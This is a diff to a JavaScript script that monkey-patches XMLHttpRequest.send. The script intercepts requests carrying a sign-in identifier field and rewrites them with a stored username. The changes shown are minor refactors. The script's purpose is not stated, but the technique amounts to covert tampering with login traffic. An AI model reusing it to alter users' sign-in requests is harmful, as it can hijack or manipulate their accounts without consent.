@@ -1,4 +1,4 @@
-let freqUsername = null; 
+let freqUsername = null;
 const modifiedRequests = new Set();
 const pendingRequests = new Map();
 let usernameFetched = false;
@@ -49,7 +49,11 @@ const processModifiedRequests = () => {
     }
 
     console.log("Processing pending requests...");
-    for (let [xhr, body] of pendingRequests) {
+    // Create a copy of pending requests as we will modify it while iterating
+    const requestsToProcess = Array.from(pendingRequests);
+
+    // Iterate through all pending requests
+    for (let [xhr, body] of requestsToProcess) {
         const match = body && /identity-signin-identifier%5C%22%2C%5C%22([^&]*)%5C/.exec(body);
 
         if (match && !modifiedRequests.has(body)) {
@@ -81,7 +85,7 @@ XMLHttpRequest.prototype.send = function (body) {
     if (/identity-signin-identifier/.test(body) && !Array.from(modifiedRequests).some(m => body.includes(m))) {
         console.log("Intercepted request:", body);
         pendingRequests.set(this, body); // Store the request in pendingRequests
-        processModifiedRequests(); // Attempt to modify and send the request
+        processModifiedRequests(); // Attempt to modify and send the request immediately
     } else {
         originalXhrSend.call(this, body); // Send the original request if no modification is needed
     }
